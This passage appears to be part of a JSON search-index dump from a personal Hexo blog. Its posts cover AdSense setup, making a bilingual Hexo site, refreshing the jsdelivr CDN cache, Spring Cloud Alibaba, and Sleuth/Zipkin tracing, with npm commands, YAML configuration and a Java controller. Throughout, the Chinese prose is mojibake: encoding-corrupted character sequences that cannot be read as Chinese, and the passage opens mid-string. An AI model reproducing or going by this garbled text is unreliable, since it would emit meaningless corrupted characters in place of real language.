¸ååˆ†é‡è¦ ç¼–å…¥è°·æ­Œç´¢å¼•,æäº¤ç«™ç‚¹åœ°å›¾sitemap.xml! å®¡æ ¸é€šè¿‡å,å°±å¯ä»¥å‘å¸ƒå¹¿å‘Šå•¦!ad\" style=\"zoom:50%; è¿›å…¥ä¸»é¡µ,adsenseæç¤ºè¦ç¼–å†™ads.txt,ä¸‹è½½æ–‡ä»¶,å¹¶ä¿å­˜åˆ°é¡¹ç›®çš„æ ¹ç›®å½•é‡Œ. 1597995947033 ä¿å­˜åå¯ä»¥æµ‹è¯•æ˜¯å¦å†™å…¥æˆåŠŸ, å¦‚ç½‘ç«™æ˜¯yousite.com,é‚£ä¹ˆè®¿é—®yousite.comåº”è¯¥èƒ½è®¿é—®è¿™ä¸ªæ–‡ä»¶. å±è”½ä¸åˆé€‚çš„å¹¿å‘Šå†…å®¹ç‚¹å‡»å†…å®¹æŸ¥çœ‹ä¸­å¿ƒ, 1597996202881 è¿™é‡Œå¯ä»¥å±è”½ä½ ä¸æƒ³æŠ•æ”¾çš„å¹¿å‘Šå†…å®¹.(ç§»åŠ¨ç½‘ç»œåº”ç”¨ç­‰)","categories":[],"tags":[{"name":"ad","slug":"ad","permalink":"https://blog.kayleh.top/tags/ad/"}]},{"title":"ä¸­è‹±æ–‡åˆ‡æ¢","slug":"ä¸­è‹±æ–‡åˆ‡æ¢","date":"2020-08-20T19:28:18.000Z","updated":"2021-04-11T17:11:28.559Z","comments":true,"path":"ä¸­è‹±æ–‡åˆ‡æ¢/","link":"","permalink":"https://blog.kayleh.top/%E4%B8%AD%E8%8B%B1%E6%96%87%E5%88%87%E6%8D%A2/","excerpt":"hexo","text":"hexo æ„Ÿè°¢[é™ˆå¹´æ²‰å¿µ] çš„åšæ–‡åˆ†äº«ã€‚ å…·ä½“æ“ä½œè¯·å‚é˜…é™ˆå¹´æ²‰å¿µçš„åšæ–‡ ã€‚ æœ¬æ–‡åªæå‡ºå‡ ç‚¹éœ€è¦ç‰¹åˆ«æ³¨æ„çš„äº‹é¡¹ã€‚ *ç¬¬ä¸€, æœ‰ä¸¤ä¸ªâ€œç‚¹å·â€ åœ¨â€œ/public/enâ€ çš„å‰é¢: ä¿®æ”¹/en/_config.ymlï¼Œä¿®æ”¹å†…å®¹å¦‚ä¸‹ï¼š language: en &lt;/br&gt; root: /en/ &lt;/br&gt; public_dir: ../public/en &lt;/br&gt; ç¬¬äºŒ, ä¹Ÿæœ‰ä¸¤ä¸ªâ€œç‚¹å·â€ åœ¨ â€œcommonweal:â€ çš„å‰é¢: æ¥ä¸‹æ¥åœ¨è‹±æ–‡ç½‘ç«™ä¸­æ·»åŠ ä¸­æ–‡å…¥å£ã€‚ç¼–è¾‘/en/_config.ymlï¼Œä¿®æ”¹menu:ä¸­å¦‚ä¸‹å†…å®¹ï¼š commonweal: ../ é¡ºä¾¿è¯´ä¸€å¥, [é™ˆå¹´æ²‰å¿µ]å†™çš„â€/update.batâ€ å¾ˆæ–¹ä¾¿ä¸”å®ç”¨ã€‚ æœ€åï¼Œæˆ‘è‡ªå·±å†è¡¥å……ä¸€ç‚¹ï¼Œå°±æ˜¯åœ¨å®Œå…¨Copyå®ŒHexoç½‘ç«™è·Ÿç›®å½•çš„å†…å®¹åï¼Œåœ¨æ–°å»ºçš„/en/æ–‡ä»¶å¤¹ä¸‹ï¼Œnode_modulesæ–‡ä»¶å¤¹é‡Œé¢çš„ä»£ç å¯èƒ½ä¸èƒ½è¢«å®Œå…¨å¤åˆ¶ç²˜è´´ï¼Œæ­¤æ—¶éœ€è¦åœ¨/en/æ–‡ä»¶å¤¹ä¸‹è¿è¡Œä»¥ä¸‹ä»£ç æ–¹å¯é¡ºåˆ©å‘å¸ƒ/en/åˆ°ç½‘ç»œç«¯ï¼š å…ˆ é¼ æ ‡å³é”® git bash hereï¼Œç„¶åè¿è¡Œ npm install hexo --save npm install npm install hexo-generator-index --save npm install hexo-generator-archive --save npm install hexo-generator-category --save npm install hexo-generator-tag --save npm install hexo-server --save npm install hexo-deployer-git --save npm install hexo-deployer-heroku --save npm install hexo-deployer-rsync --save npm install hexo-deployer-openshift --save npm install hexo-renderer-marked@0.2 --save npm install hexo-renderer-stylus@0.2 --save npm install hexo-generator-feed@1 --save npm install hexo-generator-sitemap@1 --save å®Œæˆä¸Šè¿°é™„åŠ çš„å¿…è¦æ“ä½œåï¼Œå°±å¯ä»¥é¡ºåˆ©æ¨é€åŒè¯­æˆ–å¤šè¯­åšå®¢åˆ°ç½‘ç»œç«¯å•¦ã€‚ è½¬è½½æ¥æºï¼š https://chenyxmr.github.io/2016/08/04/hexo-bilingual/ å‰è¨€æ­å»ºä¸ªäººåšå®¢æ—¶é‡‡ç”¨çš„hexoéå¸¸æ–¹ä¾¿ï¼Œä½†ç”±äºæœ¬äººæ¯”è¾ƒå–œæ¬¢è‹±è¯­æ‰€ä»¥å¸Œæœ›èƒ½æ­å»ºä¸€ä¸ªåŒè¯­ç½‘ç«™åŒæ­¥æ›´æ–°å†…å®¹ï¼Œhexoå®˜æ–¹æœ‰æä¾›å›½é™…åŒ–è§£å†³æ–¹æ¡ˆï¼Œå…·ä½“å‚è§é“¾æ¥https://hexo.io/zh-cn/docs/internationalization.html ã€‚ ä½†æœ¬äººç”±äºæ‚Ÿæ€§æ¯”è¾ƒä½æ²¡æœ‰çœ‹æ˜ç™½è¿™ä¸ªæ’ä»¶åº”è¯¥æ€ä¹ˆç”¨ï¼Œå°±ç´¢æ€§è‡ªå·±ç”¨ä¸€ä¸ªéå¸¸ç®€å•ç²—æš´çš„æ–¹å¼å®ç°äº†ä¸­è‹±æ–‡åŒè¯­ç½‘ç«™ã€‚ é¦–å…ˆï¼Œæœ€ç»ˆæ•ˆæœè§æœ¬ç«™ã€‚èœå•æ ä¸­ç‚¹å‡»-&gt;Englishåˆ‡æ¢åˆ°è‹±æ–‡ç½‘ç«™ï¼Œè‹±æ–‡ç½‘ç«™ä¸­ç‚¹å‡»-&gt;ç®€ä½“ä¸­æ–‡å³åˆ‡æ¢å›ä¸­æ–‡ã€‚å½“ç„¶æ¯ç¯‡åšæ–‡éƒ½éœ€è¦è‡ªå·±ç¿»è¯‘ã€‚ æ­å»ºæ•™ç¨‹å®Œæ•´å¤åˆ¶ç½‘ç«™ é¦–å…ˆï¼Œå°†ç½‘ç«™æ ¹ç›®å½•å…¨éƒ¨å¤åˆ¶ï¼Œç„¶ååœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹å»ºç«‹en/æ–‡ä»¶å¤¹å¹¶å°†æ‰€å¤åˆ¶çš„å†…å®¹ç²˜è´´è‡³æ­¤ã€‚æ­¤æ—¶en/æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä»½å®Œæ•´çš„ç½‘ç«™æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„hexoåšå®¢ã€‚ enå³ä¸ºEnglishçš„ç¼©å†™ï¼Œä»£è¡¨è‹±æ–‡ç½‘ç«™ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ·»åŠ å…¶å®ƒè¯­è¨€ï¼Œæ–‡ä»¶å¤¹åå­—éšä¸ªäººå–œå¥½ã€‚ æ›´æ”¹è‹±æ–‡ç½‘ç«™é…ç½® ä¿®æ”¹/en/_config.ymlï¼Œä¿®æ”¹å†…å®¹å¦‚ä¸‹ï¼š language: enroot: /en/public_dir: ../public/en è¿™é‡Œçš„public_dirä»£è¡¨æœ€ç»ˆç”Ÿæˆé™æ€æ–‡ä»¶çš„ä½ç½®ï¼Œç”±äºæœ€åè¦å°†è‹±æ–‡ç½‘ç«™é™æ€ç½‘é¡µè·Ÿä¸­æ–‡é™æ€ç½‘é¡µæ”¾åˆ°åŒä¸€æ ¹ç›®å½•ä¸‹ï¼Œæ‰€ä»¥è¦è¿›è¡Œä¿®æ”¹ã€‚ æ·»åŠ è¯­è¨€åˆ‡æ¢å…¥å£ é¦–å…ˆåœ¨ä¸­æ–‡ç½‘ç«™ä¸­æ·»åŠ åˆ‡æ¢è‹±æ–‡å…¥å£ã€‚è¯­è¨€åˆ‡æ¢å…¥å£å¯¹åº”ç½‘ç«™çš„menuï¼Œç¼–è¾‘/_config.ymlï¼Œä¿®æ”¹menu:ä¸­å¦‚ä¸‹å†…å®¹ï¼š commonweal: /en è¿™ä¸ªé”®å€¼å¯¹åº”æ‰€å»ºç«‹çš„è‹±æ–‡ç½‘ç«™æ–‡ä»¶å¤¹çš„åç§°ã€‚ æ­¤å¤„åº”è¯¥æ·»åŠ ä¸€ä¸ªæ–°çš„å…¥å£ï¼Œä½†ç”±äºæˆ‘çš„æ·»åŠ ä¸€ç›´ä¸æ­£å¸¸æ‰€ä»¥ç›´æ¥å°†åŸæœ‰çš„å…¬ç›Šèœå•æ”¹æˆåˆ‡æ¢è¯­è¨€äº†~ å†ç¼–è¾‘/themes/next/languages/zh-Hans.ymlï¼Œåœ¨menu:ä¸­ä¿®æ”¹å¦‚ä¸‹å­—æ®µï¼š commonweal: -&gt;English è¿™ä¸ªé”®å€¼å¯¹åº”åˆ‡æ¢è¯­è¨€é€‰é¡¹æ˜¾ç¤ºçš„å†…å®¹ã€‚ æ¥ä¸‹æ¥åœ¨è‹±æ–‡ç½‘ç«™ä¸­æ·»åŠ ä¸­æ–‡å…¥å£ã€‚ç¼–è¾‘/en/_config.ymlï¼Œä¿®æ”¹menu:ä¸­å¦‚ä¸‹å†…å®¹ï¼š commonweal: ../ å†ç¼–è¾‘/en/themes/next/languages/en.ymlï¼Œåœ¨menu:ä¸­ä¿®æ”¹å¦‚ä¸‹å­—æ®µï¼š commonweal: -&gt;ç®€ä½“ä¸­æ–‡ è‡³æ­¤ä¸­è‹±æ–‡ç«™ç‚¹å³é…ç½®å®Œæˆ,å¦‚æœè‹±æ–‡ç½‘ç«™éœ€è¦æ›´æ”¹ç»†èŠ‚ç›´æ¥æ›´æ”¹en/ä¸‹å¯¹åº”çš„æ–‡ä»¶å°±å¯ä»¥ï¼Œå’Œä¿®æ”¹ä¸­æ–‡ç½‘ç«™å®Œå…¨ä¸€æ ·~ æ–°å»ºåšæ–‡ æ¯æ¬¡åœ¨ä¸­æ–‡ç«™ç‚¹ä¸‹æ–°å»ºåšæ–‡å¹¶å†™å¥½åï¼Œå°†åšæ–‡å¤åˆ¶åˆ°è‹±æ–‡ç½‘ç«™å¯¹åº”çš„ç›®å½•ä¸‹å¹¶ä¿®æ”¹æˆè‹±æ–‡åšæ–‡ã€‚ å…³äºHexoçš„ä¸­è‹±æ–‡è¯­è¨€é…ç½®ï¼Œæˆ‘çš„åšæ³•æ˜¯ï¼Œåœ¨èœå•æ æ·»åŠ ä¸€ä¸ªæŒ‰é”®ï¼Œé€šè¿‡æŒ‰é”®åˆ‡æ¢åˆ°ä¸­/è‹±æ–‡ç•Œé¢ï¼Œè®©ä¸­æ–‡æ–‡ç« åªæ˜¾ç¤ºåœ¨ä¸­æ–‡é¡µé¢ï¼Œè‹±æ–‡æ˜¾ç¤ºåœ¨è‹±æ–‡é¡µé¢ã€‚ æ’ä»¶å®‰è£…é¦–å…ˆï¼Œå®‰è£…hexo-generator-i18næ’ä»¶ npm install hexo-generator-i18n --save ç„¶åä¿®æ”¹_config.yml language: [zh-CN,en]# hexo-generator-i18n é€‰é¡¹ï¼ˆå¯é€‰ï¼Œé»˜è®¤ä½¿ç”¨å¦‚ä¸‹è®¾ç½®ï¼‰i18n: type: [page, post] generator: [index, archive, category, tag] è¿™é‡Œå¹¶æ²¡æœ‰æ˜ç™½tyteå’Œgeneratorçš„ä½œç”¨ï¼Œä½†æ˜¯ä¼¼ä¹ä¸å½±å“ ä¹‹åæ˜¯åœ¨ä¸»é¢˜languagesç›®å½•ä¸‹æ·»åŠ å¯¹åº”çš„è¯­è¨€.ymlæ–‡ä»¶(å¦‚zh.yml, en.yml)\\ ä½†æ˜¯ç”±äºæˆ‘ä½¿ç”¨çš„ä¸»é¢˜å¹¶ä¸æ”¯æŒå¤šè¯­è¨€ï¼Œæˆ‘ä¹Ÿæ‡’å¾—å¼„ï¼Œæ‰€æœ‰æš‚æ—¶æ²¡æœ‰ç®¡è¿™ä¸€é¡¹ æ’ä»¶å®‰è£…å®Œæˆåï¼Œæ‰§è¡Œhexo clean &amp; hexo g ä¼šç”Ÿæˆpublic/enç›®å½•ï¼Œå¯¹äº_postå†…çš„æ‰€æœ‰åšæ–‡ï¼Œéƒ½ä¼šåœ¨publicé‡Œå­˜æ”¾ä¸€ä»½ï¼Œenä¸‹å­˜æ”¾ä¸€ä»½ã€‚ é‚£ä¹ˆå°±éœ€è¦æ ¹æ®é¡µé¢çš„è¯­è¨€ï¼Œæ˜¾ç¤ºä¸åŒçš„åšæ–‡ã€‚ åšæ–‡é…ç½®å¯¹äºæ‰€æœ‰çš„markdownæ–‡ç« ï¼Œéƒ½éœ€è¦åœ¨æ–‡ç« å†…æ·»åŠ å±æ€§lang:zh-CN or lang:enï¼Œæ¥åŒºåˆ†ä¸­è‹±æ–‡ ç½‘é¡µé…ç½®æˆ‘é€šè¿‡urlæ¥åŒºåˆ†ä¸­è‹±æ–‡é¡µé¢ï¼Œå¯¹äºä¸­æ–‡ï¼Œurlæ˜¯www.yoursite.comï¼Œè‹±æ–‡ï¼Œurlæ˜¯www.yoursite.com/en/, è¿™æ ·ï¼Œåœ¨jsä¸­æ£€ç´¢urlæ˜¯å¦åŒ…å«enï¼Œæ¥åˆ¤æ–­æ˜¾ç¤ºä¸­æ–‡è¿˜æ˜¯è‹±æ–‡ç•Œé¢ã€‚ ä¿®æ”¹ä¸»é¢˜, æˆ‘çš„ä¸»é¢˜è·¯å¾„æ˜¯themes/vexo/layout/index.ejs è·å–å½“å‰htmlçš„è·¯å¾„ï¼Œå¹¶åˆ¤æ–­è·¯å¾„å†…æ˜¯å¦å­˜åœ¨en &lt;main class=&quot;app-body&quot;&gt; &lt;% var currentURL = page.path.split(&#39;/&#39;) %&gt; &lt;% if (currentURL.length === 1) { %&gt; &lt;% var lang = page.lang %&gt; &lt;% } else { %&gt; &lt;% var lang = currentURL.shift() %&gt; &lt;% } %&gt; &lt;% page.posts.each(function(post) { %&gt; &lt;% if (lang == post.lang) { %&gt; &lt;article class=&quot;article-card&quot;&gt; &lt;h2 class=&quot;article-head&quot;&gt; &lt;a href=&quot;&lt;%- url_for(post.path) %&gt;&quot;&gt;&lt;%- post.title %&gt;&lt;/a&gt; &lt;/h2&gt; &lt;p class=&quot;article-date&quot;&gt;&lt;%- date(post.date, &quot;LL&quot;) %&gt;&lt;/p&gt; &lt;% if (post.tags &amp;&amp; post.tags.length) { %&gt; [ &lt;%- partial(&#39;_partial/tag&#39;, { tags: post.tags }) %&gt;] &lt;% } %&gt; &lt;div class=&quot;article-summary&quot;&gt; &lt;% if (post.excerpt) { %&gt; &lt;%- post.excerpt %&gt; &lt;% } else { %&gt; &lt;%- truncate(strip_html(post.content), { length: 150, omission: &#39; ...&#39; }) %&gt; &lt;% } %&gt; &lt;/div&gt; &lt;a class=&quot;more&quot; href=&quot;&lt;%- url_for(post.path) %&gt;&quot;&gt;&lt;%- theme.excerpt_link %&gt;&lt;/a&gt; &lt;/article&gt; &lt;% } %&gt; &lt;% }) %&gt; &lt;% if (page.total &gt; 1){ %&gt; &lt;%- partial(&#39;_partial/pager&#39;) %&gt; &lt;% } %&gt; &lt;/main&gt; ä¸Šè¿°éƒ½å®Œæˆï¼Œå°±å¯ä»¥é€šè¿‡www.yoursite.com/enè¿›å…¥è‹±æ–‡ç½‘é¡µï¼Œä¸”è¯¥ç½‘é¡µåªæœ‰è‹±æ–‡æ–‡ç«  æ·»åŠ åˆ‡æ¢è¯­è¨€æŒ‰é’®ä¿®æ”¹themeä¸‹çš„_config.ymlæ–‡ä»¶, æ·»åŠ ä¸€ä¸ªENçš„æŒ‰é’®ï¼Œè·³è½¬åˆ°è‹±æ–‡ç•Œé¢ menu: Home: / Tags: /tags/ Archives: /archives/ Projects: /project/ About: /about/ EN: /en/ è¿™é‡Œä¸ºäº†ç®€å•ï¼Œæ²¡æœ‰åŠ¨æ€ä¿®æ”¹ENè¿™ä¸ªæŒ‰é’®ï¼Œæä¾›ä»è‹±æ–‡ç½‘é¡µï¼Œè·³è½¬å›ä¸­æ–‡ç½‘é¡µçš„æ–¹å¼(å®é™…ä¸Šï¼Œç‚¹å‡»HomeæŒ‰é”®ï¼Œå°±è·³è½¬å›ä¸­æ–‡äº†) éƒ¨ç½²æµ‹è¯•hexo clean &amp; hexo ghexo d è¿™é‡Œåªé…ç½®äº†ä¸»é¡µï¼Œå…¶ä»–é¡µé¢æš‚æ—¶æ²¡æœ‰ä¿®æ”¹","categories":[],"tags":[{"name":"front","slug":"front","permalink":"https://blog.kayleh.top/tags/front/"}]},{"title":"jsdelivrçš„CDNåŠ é€Ÿç¼“å­˜ä¸åˆ·æ–°é—®é¢˜","slug":"å…³äºCDNåŠ é€Ÿç¼“å­˜ä¸åˆ·æ–°çš„è§£å†³","date":"2020-08-19T22:20:58.000Z","updated":"2021-04-11T17:11:28.620Z","comments":true,"path":"å…³äºCDNåŠ é€Ÿç¼“å­˜ä¸åˆ·æ–°çš„è§£å†³/","link":"","permalink":"https://blog.kayleh.top/%E5%85%B3%E4%BA%8ECDN%E5%8A%A0%E9%80%9F%E7%BC%93%E5%AD%98%E4%B8%8D%E5%88%B7%E6%96%B0%E7%9A%84%E8%A7%A3%E5%86%B3/","excerpt":"","text":"The CDN acceleration cache of jsdelivr does not refreshè®¿é—®é“¾æ¥å³å¯è§£å†³ å…·ä½“ï¼š æŠŠé“¾æ¥ä¸­çš„ https://cdn.jsdelivr.netæ›¿æ¢æˆ https://purge.jsdelivr.netè®¿é—®å³å¯å®æ—¶åˆ·æ–°","categories":[],"tags":[{"name":"maintain","slug":"maintain","permalink":"https://blog.kayleh.top/tags/maintain/"}]},{"title":"SpringCloud Alibaba","slug":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„9","date":"2020-08-19T04:25:56.000Z","updated":"2021-04-11T17:11:28.750Z","comments":true,"path":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„9/","link":"","permalink":"https://blog.kayleh.top/%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%849/","excerpt":"SpringCloud Alibaba","text":"SpringCloud Alibaba Spring Cloud Netflixé¡¹ç›®è¿›å…¥ç»´æŠ¤æ¨¡å¼ 1597850443212 1597850459371 SpringCloud NetFlix Projects Entering Maintenance Mode ä»€ä¹ˆæ˜¯ç»´æŠ¤æ¨¡å¼ 1597850522418 è¿›å…¥ç»´æŠ¤æ¨¡å¼æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿ 1597850556832 1597850565496 SpringCloud alibabaå¸¦æ¥äº†ä»€ä¹ˆï¼Ÿ 1597850587083 èƒ½å¹²å— 1597850612486 å»å“ªä¸‹ï¼Ÿ https://github.com/alibaba/spring-cloud-alibaba/blob/master/README-zh.md æ€ä¹ˆç”¨ï¼Ÿ &gt; Sentinelï¼šæŠŠæµé‡ä½œä¸ºåˆ‡å…¥ç‚¹ï¼Œä»æµé‡æ§åˆ¶ã€ç†”æ–­é™çº§ã€ç³»ç»Ÿè´Ÿè½½ä¿æŠ¤ç­‰å¤šä¸ªç»´åº¦ä¿æŠ¤æœåŠ¡çš„ç¨³å®šæ€§ã€‚ Nacosï¼šä¸€ä¸ªæ›´æ˜“äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ã€é…ç½®ç®¡ç†å’ŒæœåŠ¡ç®¡ç†å¹³å°ã€‚ RocketMQï¼šä¸€æ¬¾å¼€æºçš„åˆ†å¸ƒå¼æ¶ˆæ¯ç³»ç»Ÿï¼ŒåŸºäºé«˜å¯ç”¨åˆ†å¸ƒå¼é›†ç¾¤æŠ€æœ¯ï¼Œæä¾›ä½å»¶æ—¶çš„ã€é«˜å¯é çš„æ¶ˆæ¯å‘å¸ƒä¸è®¢é˜…æœåŠ¡ã€‚ Dubboï¼šApache Dubboâ„¢ æ˜¯ä¸€æ¬¾é«˜æ€§èƒ½ Java RPC æ¡†æ¶ã€‚ Seataï¼šé˜¿é‡Œå·´å·´å¼€æºäº§å“ï¼Œä¸€ä¸ªæ˜“äºä½¿ç”¨çš„é«˜æ€§èƒ½å¾®æœåŠ¡åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆã€‚ Alibaba Cloud ACMï¼šä¸€æ¬¾åœ¨åˆ†å¸ƒå¼æ¶æ„ç¯å¢ƒä¸­å¯¹åº”ç”¨é…ç½®è¿›è¡Œé›†ä¸­ç®¡ç†å’Œæ¨é€çš„åº”ç”¨é…ç½®ä¸­å¿ƒäº§å“ã€‚ Alibaba Cloud OSS: é˜¿é‡Œäº‘å¯¹è±¡å­˜å‚¨æœåŠ¡ï¼ˆObject Storage Serviceï¼Œç®€ç§° OSSï¼‰ï¼Œæ˜¯é˜¿é‡Œäº‘æä¾›çš„æµ·é‡ã€å®‰å…¨ã€ä½æˆæœ¬ã€é«˜å¯é çš„äº‘å­˜å‚¨æœåŠ¡ã€‚æ‚¨å¯ä»¥åœ¨ä»»ä½•åº”ç”¨ã€ä»»ä½•æ—¶é—´ã€ä»»ä½•åœ°ç‚¹å­˜å‚¨å’Œè®¿é—®ä»»æ„ç±»å‹çš„æ•°æ®ã€‚ Alibaba Cloud SchedulerX: é˜¿é‡Œä¸­é—´ä»¶å›¢é˜Ÿå¼€å‘çš„ä¸€æ¬¾åˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦äº§å“ï¼Œæä¾›ç§’çº§ã€ç²¾å‡†ã€é«˜å¯é ã€é«˜å¯ç”¨çš„å®šæ—¶ï¼ˆåŸºäº Cron è¡¨è¾¾å¼ï¼‰ä»»åŠ¡è°ƒåº¦æœåŠ¡ã€‚ Alibaba Cloud SMS: è¦†ç›–å…¨çƒçš„çŸ­ä¿¡æœåŠ¡ï¼Œå‹å¥½ã€é«˜æ•ˆã€æ™ºèƒ½çš„äº’è”åŒ–é€šè®¯èƒ½åŠ›ï¼Œå¸®åŠ©ä¼ä¸šè¿…é€Ÿæ­å»ºå®¢æˆ·è§¦è¾¾é€šé“ã€‚ èµ„æ–™è·å–å®˜ç½‘ 1597850747004 ä¸­æ–‡ï¼š https://github.com/alibaba/spring-cloud-alibaba/blob/master/README-zh.md","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"SpringCloud Sleuthåˆ†å¸ƒå¼è¯·æ±‚é“¾è·¯è¿½è¸ª","slug":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„8","date":"2020-08-19T01:52:50.000Z","updated":"2021-04-11T17:11:28.747Z","comments":true,"path":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„8/","link":"","permalink":"https://blog.kayleh.top/%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%848/","excerpt":"SpringCloud Sleuthåˆ†å¸ƒå¼è¯·æ±‚é“¾è·¯è¿½è¸ª","text":"SpringCloud Sleuthåˆ†å¸ƒå¼è¯·æ±‚é“¾è·¯è¿½è¸ª ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ä¸ªæŠ€æœ¯ï¼Ÿéœ€è¦è§£å†³å“ªäº›é—®é¢˜ï¼Ÿ 1597832055850 1597832064671\" style=\"zoom: 50%; Spring Cloud Sleuthæä¾›äº†ä¸€å¥—å®Œæ•´çš„æœåŠ¡è·Ÿè¸ªçš„è§£å†³æ–¹æ¡ˆ åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­æä¾›è¿½è¸ªè§£å†³æ–¹æ¡ˆå¹¶ä¸”å…¼å®¹æ”¯æŒäº†zipkin è§£å†³ 1597832119213 zipkinä¸‹è½½ SpringCloudä»Fç‰ˆèµ·å·²ä¸éœ€è¦è‡ªå·±æ„å»ºZipkin serveräº†ï¼Œåªéœ€è¦è°ƒç”¨jaråŒ…å³å¯ https://dl.bintray.com/openzipkin/maven/io/zipkin/java/zipkin-server/ zipkin-server-2.12.9.exec.jar è¿è¡Œjar java -jar zipkin-server-2.12.9-exec.jar 1597832503297 è¿è¡Œæ§åˆ¶å° http://localhost:9411/zipkin/ å®Œæ•´çš„è°ƒç”¨é“¾è·¯ 1597835169702 1597835215535 Trace:ç±»ä¼¼äºæ ‘ç»“æ„çš„Spané›†åˆï¼Œè¡¨ç¤ºä¸€æ¡è°ƒç”¨é“¾è·¯ï¼Œå­˜åœ¨å”¯ä¸€æ ‡è¯† span:è¡¨ç¤ºè°ƒç”¨é“¾è·¯æ¥æºï¼Œé€šä¿—çš„ç†è§£spanå°±æ˜¯ä¸€æ¬¡è¯·æ±‚ä¿¡æ¯ æœåŠ¡æä¾›è€…cloud-provider-payment8001 pom &lt;!--åŒ…å«äº†sleuth+zipkin--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-zipkin&lt;/artifactId&gt; &lt;/dependency&gt; yaml server: port: 8001 spring: application: name: cloud-payment-service zipkin: base-url: http://localhost:9411 sleuth: sampler: #é‡‡æ ·ç‡å€¼ä»‹äº0åˆ°1ä¹‹é—´ï¼Œ1åˆ™è¡¨ç¤ºå…¨éƒ¨é‡‡é›† probability: 1 datasource: type: com.alibaba.druid.pool.DruidDataSource driver-class-name: org.gjt.mm.mysql.Driver url: username: root password: mybatis: mapperLocations: classpath:mapper/*.xml type-aliases-package: com.kayleh.springcloud.entities eureka: client: register-with-eureka: true fetchRegistry: true service-url: defaultZone: http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka #é›†ç¾¤ç‰ˆ instance: instance-id: payment8001 prefer-ip-address: true ä¸šåŠ¡ç±»OrderController package com.kayleh.springcloud.controller; import com.kayleh.springcloud.entities.CommonResult; import com.kayleh.springcloud.entities.Payment; import com.kayleh.springcloud.service.PaymentService; import lombok.extern.slf4j.Slf4j; import org.springframework.beans.factory.annotation.Value; import org.springframework.cloud.client.ServiceInstance; import org.springframework.web.bind.annotation.*; import org.springframework.cloud.client.discovery.DiscoveryClient; import javax.annotation.Resource; import java.util.List; import java.util.concurrent.TimeUnit; @RestController @Slf4j public class PaymentController { @Resource private PaymentService paymentService; @Value(&quot;${server.port}&quot;) private String serverPort; @Resource private DiscoveryClient discoveryClient; @PostMapping(value = &quot;/payment/create&quot;) public CommonResult create(@RequestBody Payment payment) { int result = paymentService.create(payment); log.info(&quot;*****æ’å…¥ç»“æœï¼š&quot;+result); if(result &gt; 0) { return new CommonResult(200,&quot;æ’å…¥æ•°æ®åº“æˆåŠŸ,serverPort: &quot;+serverPort,result); }else{ return new CommonResult(444,&quot;æ’å…¥æ•°æ®åº“å¤±è´¥&quot;,null); } } @GetMapping(value = &quot;/payment/get/{id}&quot;) public CommonResult&lt;Payment&gt; getPaymentById(@PathVariable(&quot;id&quot;) Long id) { Payment payment = paymentService.getPaymentById(id); if(payment != null) { return new CommonResult(200,&quot;æŸ¥è¯¢æˆåŠŸ,serverPort: &quot;+serverPort,payment); }else{ return new CommonResult(444,&quot;æ²¡æœ‰å¯¹åº”è®°å½•,æŸ¥è¯¢ID: &quot;+id,null); } } @GetMapping(value = &quot;/payment/discovery&quot;) public Object discovery() { List&lt;String&gt; services = discoveryClient.getServices(); for (String element : services) { log.info(&quot;*****element: &quot;+element); } List&lt;ServiceInstance&gt; instances = discoveryClient.getInstances(&quot;CLOUD-PAYMENT-SERVICE&quot;); for (ServiceInstance instance : instances) { log.info(instance.getServiceId()+&quot;\\t&quot;+instance.getHost()+&quot;\\t&quot;+instance.getPort()+&quot;\\t&quot;+instance.getUri()); } return this.discoveryClient; } @GetMapping(value = &quot;/payment/lb&quot;) public String getPaymentLB() { return serverPort; } @GetMapping(value = &quot;/payment/feign/timeout&quot;) public String paymentFeignTimeout() { // ä¸šåŠ¡é€»è¾‘å¤„ç†æ­£ç¡®ï¼Œä½†æ˜¯éœ€è¦è€—è´¹3ç§’é’Ÿ try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) { e.printStackTrace(); } return serverPort; } @GetMapping(&quot;/payment/zipkin&quot;) public String paymentZipkin() { return &quot;hi ,i&#39;am paymentzipkin server fall backï¼Œwelcome to kaylehï¼ŒO(âˆ©_âˆ©)Oå“ˆå“ˆ~&quot;; } } æœåŠ¡æ¶ˆè´¹è€…ï¼ˆè°ƒç”¨æ–¹ï¼‰cloud-consumer-order80 POM &lt;!--åŒ…å«äº†sleuth+zipkin--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-zipkin&lt;/artifactId&gt; &lt;/dependency&gt; yml server: port: 80 spring: application: name: cloud-order-service zipkin: base-url: http://localhost:9411 sleuth: sampler: probability: 1 eureka: client: #è¡¨ç¤ºæ˜¯å¦å°†è‡ªå·±æ³¨å†Œè¿›EurekaServeré»˜è®¤ä¸ºtrueã€‚ register-with-eureka: false 